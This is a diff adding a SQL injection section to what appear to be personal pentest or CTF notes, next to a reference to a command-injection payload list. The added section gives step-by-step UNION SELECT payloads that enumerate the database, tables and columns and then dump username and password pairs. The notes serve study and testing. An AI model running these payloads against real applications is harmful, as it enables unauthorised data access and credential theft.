@@ -104,3 +104,21 @@ https://github.com/payloadbox/command-injection-payload-list
 
 Use ";" to chain syscall.
 
+## SQL Injection
+
+    0 UNION SELECT 1,2,database()  (database() returns the name of the database) 
+
+Once we know the name of the database, we get the tables of the database
+
+    0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = '<database name>'
+
+Then get the colums name of the table we're interested in
+
+    0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = '<table name>'
+
+Then display the content: 
+
+    0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users (where 'username' and 'password' are column names)
+
+
+
